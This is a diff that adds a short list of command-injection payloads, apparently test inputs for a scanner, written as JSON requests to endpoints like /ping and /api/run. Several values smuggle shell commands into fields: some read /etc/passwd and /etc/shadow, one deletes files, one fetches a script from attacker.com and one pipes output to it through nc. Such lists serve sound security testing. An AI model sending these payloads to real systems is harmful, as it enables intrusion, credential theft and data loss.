@@ -1,0 +1,23 @@
+1. Semicolon chaining:
+
+
+{"path":"/ping","method":"POST","payload":{"host":"127.0.0.1; cat /etc/passwd"}}
+2. Pipe to exfiltrate:
+
+
+{"path":"/lookup","method":"POST","payload":{"domain":"google.com| cat /etc/shadow"}}
+3. Subshell execution:
+
+
+{"path":"/status","method":"POST","payload":{"server":"$(whoami)"}}
+
+
+{"path":"/api/run","method":"POST","payload":{"command":"cat /etc/passwd && whoami"}}
+
+{"path":"/terminal","method":"POST","payload":{"cmd":"ping google.com; rm -rf /tmp/test"}}
+
+{"path":"/admin/execute","method":"POST","payload":{"shell":"bash -c 'ls -la && uname -a'"}}
+
+{"path":"/system/debug","method":"GET","payload":{"input":"$(curl attacker.com/script.sh)"}}
+
+{"path":"/api/process","method":"POST","payload":{"task":"echo test | nc attacker.com 4444"}}
